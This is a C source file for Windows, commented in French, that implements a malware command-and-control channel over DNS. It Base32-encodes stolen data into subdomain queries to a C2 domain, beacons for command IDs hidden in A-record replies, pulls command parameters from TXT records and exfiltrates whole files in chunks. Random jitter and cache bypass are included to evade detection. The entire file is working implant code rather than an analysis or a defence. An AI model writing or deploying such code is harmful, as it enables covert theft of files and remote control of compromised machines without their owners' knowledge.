/*
 * dns_exfil.c - c2 over dns
 * base32 dans subdomains, TXT records
 */

#include <windows.h>
#include <windns.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "dns_exfil.h"

#pragma comment(lib, "dnsapi.lib")

// ============================================================================
// CONFIGURATION
// ============================================================================

#define DNS_MAX_LABEL_LEN   63      // Max longueur d'un label DNS
#define DNS_MAX_NAME_LEN    253     // Max longueur d'un nom DNS
#define DNS_CHUNK_SIZE      30      // Taille des chunks pour sous-domaines (base32)
#define DNS_JITTER_MIN      100     // Jitter minimum (ms)
#define DNS_JITTER_MAX      2000    // Jitter maximum (ms)

// Domaine C2 (à configurer)
static char g_c2_domain[256] = "c2.example.com";

// ============================================================================
// ENCODAGE BASE32
// ============================================================================

static const char BASE32_ALPHABET[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";

/**
 * @brief Encode des données en Base32
 * @param input Données à encoder
 * @param input_len Longueur des données
 * @param output Buffer de sortie (doit être >= (input_len * 8 + 4) / 5 + 1)
 * @return Longueur de la chaîne encodée
 */
static DWORD Base32_Encode(const BYTE* input, DWORD input_len, char* output) {
    DWORD i = 0, j = 0;
    DWORD buffer = 0;
    int bits_left = 0;
    
    while (i < input_len || bits_left > 0) {
        if (bits_left < 5 && i < input_len) {
            buffer = (buffer << 8) | input[i++];
            bits_left += 8;
        }
        
        if (bits_left >= 5) {
            bits_left -= 5;
            output[j++] = BASE32_ALPHABET[(buffer >> bits_left) & 0x1F];
        } else if (bits_left > 0) {
            output[j++] = BASE32_ALPHABET[(buffer << (5 - bits_left)) & 0x1F];
            bits_left = 0;
        }
    }
    
    output[j] = '\0';
    return j;
}

/**
 * @brief Décode du Base32
 * @return Longueur des données décodées
 */
static DWORD Base32_Decode(const char* input, BYTE* output) {
    DWORD buffer = 0;
    int bits_left = 0;
    DWORD output_len = 0;
    
    for (DWORD i = 0; input[i]; i++) {
        char c = input[i];
        int val;
        
        if (c >= 'A' && c <= 'Z') {
            val = c - 'A';
        } else if (c >= '2' && c <= '7') {
            val = c - '2' + 26;
        } else if (c >= 'a' && c <= 'z') {
            val = c - 'a';  // Lowercase support
        } else {
            continue;  // Skip invalid chars
        }
        
        buffer = (buffer << 5) | val;
        bits_left += 5;
        
        if (bits_left >= 8) {
            bits_left -= 8;
            output[output_len++] = (BYTE)(buffer >> bits_left);
        }
    }
    
    return output_len;
}

// ============================================================================
// REQUÊTES DNS
// ============================================================================

/**
 * @brief Configure le domaine C2
 */
void DNS_SetC2Domain(const char* domain) {
    if (domain && strlen(domain) < sizeof(g_c2_domain)) {
        strncpy(g_c2_domain, domain, sizeof(g_c2_domain) - 1);
    }
}

/**
 * @brief Ajoute un jitter aléatoire entre les requêtes
 */
static void DNS_Jitter(void) {
    DWORD jitter = DNS_JITTER_MIN + (rand() % (DNS_JITTER_MAX - DNS_JITTER_MIN));
    Sleep(jitter);
}

/**
 * @brief Envoie des données via sous-domaines DNS
 * Format: <chunk_index>.<session_id>.<base32_data>.c2.example.com
 * 
 * @param data Données à exfiltrer
 * @param data_len Longueur des données
 * @param session_id ID de session unique
 * @return TRUE si succès
 */
BOOL DNS_Exfil_Send(const BYTE* data, DWORD data_len, const char* session_id) {
    if (!data || data_len == 0) return FALSE;
    
    // Calculer le nombre de chunks nécessaires
    char encoded[DNS_MAX_NAME_LEN];
    DWORD encoded_len = Base32_Encode(data, data_len, encoded);
    
    DWORD num_chunks = (encoded_len + DNS_CHUNK_SIZE - 1) / DNS_CHUNK_SIZE;
    
    for (DWORD i = 0; i < num_chunks; i++) {
        // Extraire le chunk
        char chunk[DNS_CHUNK_SIZE + 1] = {0};
        DWORD offset = i * DNS_CHUNK_SIZE;
        DWORD chunk_len = min(DNS_CHUNK_SIZE, encoded_len - offset);
        memcpy(chunk, encoded + offset, chunk_len);
        
        // Construire le nom DNS
        // Format: <index>-<total>.<session>.<chunk>.domain.com
        char dns_name[DNS_MAX_NAME_LEN];
        snprintf(dns_name, sizeof(dns_name), "%lu-%lu.%s.%s.%s",
            (unsigned long)i, (unsigned long)num_chunks,
            session_id,
            chunk,
            g_c2_domain);
        
        // Convertir en wide string pour DnsQuery
        wchar_t wdns_name[DNS_MAX_NAME_LEN];
        MultiByteToWideChar(CP_UTF8, 0, dns_name, -1, wdns_name, DNS_MAX_NAME_LEN);
        
        // Faire la requête A (on ignore la réponse, c'est le fait de la faire qui compte)
        PDNS_RECORD pDnsRecord = NULL;
        DNS_STATUS status = DnsQuery_W(
            wdns_name,
            DNS_TYPE_A,
            DNS_QUERY_BYPASS_CACHE | DNS_QUERY_NO_HOSTS_FILE,
            NULL,
            &pDnsRecord,
            NULL
        );
        
        if (pDnsRecord) {
            DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
        }
        
        // Jitter entre les requêtes
        if (i < num_chunks - 1) {
            DNS_Jitter();
        }
    }
    
    return TRUE;
}

/**
 * @brief Reçoit des données via requête TXT
 * @param session_id ID de session
 * @param output Buffer de sortie
 * @param max_len Taille max du buffer
 * @return Longueur des données reçues
 */
DWORD DNS_Exfil_Recv(const char* session_id, BYTE* output, DWORD max_len) {
    if (!session_id || !output) return 0;
    
    // Construire le nom DNS pour la requête TXT
    char dns_name[DNS_MAX_NAME_LEN];
    snprintf(dns_name, sizeof(dns_name), "recv.%s.%s", session_id, g_c2_domain);
    
    wchar_t wdns_name[DNS_MAX_NAME_LEN];
    MultiByteToWideChar(CP_UTF8, 0, dns_name, -1, wdns_name, DNS_MAX_NAME_LEN);
    
    // Requête TXT
    PDNS_RECORD pDnsRecord = NULL;
    DNS_STATUS status = DnsQuery_W(
        wdns_name,
        DNS_TYPE_TEXT,
        DNS_QUERY_BYPASS_CACHE,
        NULL,
        &pDnsRecord,
        NULL
    );
    
    if (status != 0 || !pDnsRecord) {
        return 0;
    }
    
    // Extraire les données TXT
    DWORD total_len = 0;
    char encoded_data[4096] = {0};
    
    PDNS_RECORD pRecord = pDnsRecord;
    while (pRecord) {
        if (pRecord->wType == DNS_TYPE_TEXT) {
            // Concaténer tous les strings TXT
            for (DWORD i = 0; i < pRecord->Data.TXT.dwStringCount; i++) {
                if (pRecord->Data.TXT.pStringArray[i]) {
                    // Convertir de wide à multibyte
                    char str[256];
                    WideCharToMultiByte(CP_UTF8, 0, 
                        pRecord->Data.TXT.pStringArray[i], -1,
                        str, sizeof(str), NULL, NULL);
                    
                    size_t str_len = strlen(str);
                    if (strlen(encoded_data) + str_len < sizeof(encoded_data)) {
                        strcat(encoded_data, str);
                    }
                }
            }
        }
        pRecord = pRecord->pNext;
    }
    
    DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
    
    // Décoder le Base32
    if (strlen(encoded_data) > 0) {
        total_len = Base32_Decode(encoded_data, output);
        if (total_len > max_len) {
            total_len = max_len;
        }
    }
    
    return total_len;
}

// ============================================================================
// BEACON OVER DNS
// ============================================================================

/**
 * @brief Envoie un beacon via DNS
 * @param agent_id ID de l'agent
 * @return ID de commande reçu (0 = pas de commande)
 */
DWORD DNS_Beacon(const char* agent_id) {
    if (!agent_id) return 0;
    
    // Format beacon: beacon.<agent_id>.c2.domain.com
    char dns_name[DNS_MAX_NAME_LEN];
    snprintf(dns_name, sizeof(dns_name), "beacon.%s.%s", agent_id, g_c2_domain);
    
    wchar_t wdns_name[DNS_MAX_NAME_LEN];
    MultiByteToWideChar(CP_UTF8, 0, dns_name, -1, wdns_name, DNS_MAX_NAME_LEN);
    
    // Requête A - l'adresse IP retournée encode la commande
    PDNS_RECORD pDnsRecord = NULL;
    DNS_STATUS status = DnsQuery_W(
        wdns_name,
        DNS_TYPE_A,
        DNS_QUERY_BYPASS_CACHE,
        NULL,
        &pDnsRecord,
        NULL
    );
    
    if (status != 0 || !pDnsRecord) {
        return 0;
    }
    
    DWORD cmd_id = 0;
    
    // L'adresse IP encode la commande
    // Ex: 10.0.0.5 -> commande ID 5
    // Ex: 10.1.2.3 -> commande ID 0x010203
    if (pDnsRecord->wType == DNS_TYPE_A) {
        DWORD ip = pDnsRecord->Data.A.IpAddress;
        
        // Format: 10.X.Y.Z où X.Y.Z = command ID
        BYTE* bytes = (BYTE*)&ip;
        if (bytes[0] == 10) {  // Notre namespace C2
            cmd_id = (bytes[1] << 16) | (bytes[2] << 8) | bytes[3];
        }
    }
    
    DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
    
    return cmd_id;
}

/**
 * @brief Récupère les paramètres d'une commande
 * @param agent_id ID de l'agent
 * @param cmd_id ID de la commande
 * @param output Buffer de sortie
 * @param max_len Taille max
 * @return Longueur des données
 */
DWORD DNS_GetCommand(const char* agent_id, DWORD cmd_id, BYTE* output, DWORD max_len) {
    if (!agent_id || !output) return 0;
    
    // Format: cmd.<cmd_id>.<agent_id>.c2.domain.com -> TXT avec les params
    char dns_name[DNS_MAX_NAME_LEN];
    snprintf(dns_name, sizeof(dns_name), "cmd.%lu.%s.%s", 
        (unsigned long)cmd_id, agent_id, g_c2_domain);
    
    wchar_t wdns_name[DNS_MAX_NAME_LEN];
    MultiByteToWideChar(CP_UTF8, 0, dns_name, -1, wdns_name, DNS_MAX_NAME_LEN);
    
    PDNS_RECORD pDnsRecord = NULL;
    DNS_STATUS status = DnsQuery_W(
        wdns_name,
        DNS_TYPE_TEXT,
        DNS_QUERY_BYPASS_CACHE,
        NULL,
        &pDnsRecord,
        NULL
    );
    
    if (status != 0 || !pDnsRecord) {
        return 0;
    }
    
    DWORD total_len = 0;
    char encoded[4096] = {0};
    
    PDNS_RECORD pRecord = pDnsRecord;
    while (pRecord && pRecord->wType == DNS_TYPE_TEXT) {
        for (DWORD i = 0; i < pRecord->Data.TXT.dwStringCount; i++) {
            if (pRecord->Data.TXT.pStringArray[i]) {
                char str[256];
                WideCharToMultiByte(CP_UTF8, 0,
                    pRecord->Data.TXT.pStringArray[i], -1,
                    str, sizeof(str), NULL, NULL);
                
                if (strlen(encoded) + strlen(str) < sizeof(encoded)) {
                    strcat(encoded, str);
                }
            }
        }
        pRecord = pRecord->pNext;
    }
    
    DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
    
    if (strlen(encoded) > 0) {
        total_len = Base32_Decode(encoded, output);
        if (total_len > max_len) {
            total_len = max_len;
        }
    }
    
    return total_len;
}

/**
 * @brief Envoie un résultat de commande
 */
BOOL DNS_SendResult(const char* agent_id, DWORD cmd_id, const BYTE* data, DWORD data_len) {
    // Créer un session_id basé sur l'agent et la commande
    char session_id[64];
    snprintf(session_id, sizeof(session_id), "r%lu.%s", (unsigned long)cmd_id, agent_id);
    
    return DNS_Exfil_Send(data, data_len, session_id);
}

// ============================================================================
// EXFILTRATION DE FICHIERS
// ============================================================================

/**
 * @brief Exfiltre un fichier complet via DNS
 * @param filepath Chemin du fichier
 * @param session_id ID de session unique
 * @return TRUE si succès
 */
BOOL DNS_ExfilFile(const char* filepath, const char* session_id) {
    HANDLE hFile = CreateFileA(
        filepath,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    
    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }
    
    DWORD file_size = GetFileSize(hFile, NULL);
    if (file_size == INVALID_FILE_SIZE || file_size == 0) {
        CloseHandle(hFile);
        return FALSE;
    }
    
    // Lire le fichier par chunks
    BYTE buffer[1024];  // 1KB per iteration
    DWORD bytes_read;
    DWORD total_sent = 0;
    DWORD chunk_index = 0;
    
    while (ReadFile(hFile, buffer, sizeof(buffer), &bytes_read, NULL) && bytes_read > 0) {
        // Créer un session_id avec l'index
        char chunk_session[128];
        snprintf(chunk_session, sizeof(chunk_session), "%s.f%lu", session_id, (unsigned long)chunk_index);
        
        if (!DNS_Exfil_Send(buffer, bytes_read, chunk_session)) {
            CloseHandle(hFile);
            return FALSE;
        }
        
        total_sent += bytes_read;
        chunk_index++;
        
        // Pause plus longue entre les chunks de fichier
        Sleep(rand() % 3000 + 1000);  // 1-4 secondes
    }
    
    CloseHandle(hFile);
    return TRUE;
}

// ============================================================================
// UTILITAIRES
// ============================================================================

/**
 * @brief Génère un ID de session aléatoire
 */
void DNS_GenerateSessionId(char* output, DWORD max_len) {
    static const char charset[] = "abcdefghijklmnopqrstuvwxyz0123456789";
    DWORD len = min(max_len - 1, 8);
    
    for (DWORD i = 0; i < len; i++) {
        output[i] = charset[rand() % (sizeof(charset) - 1)];
    }
    output[len] = '\0';
}

/**
 * @brief Vérifie la connectivité DNS
 */
BOOL DNS_CheckConnectivity(void) {
    // Essayer de résoudre google.com
    wchar_t* test_domain = L"google.com";
    PDNS_RECORD pDnsRecord = NULL;
    
    DNS_STATUS status = DnsQuery_W(
        test_domain,
        DNS_TYPE_A,
        DNS_QUERY_BYPASS_CACHE,
        NULL,
        &pDnsRecord,
        NULL
    );
    
    if (pDnsRecord) {
        DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
    }
    
    return (status == 0);
}
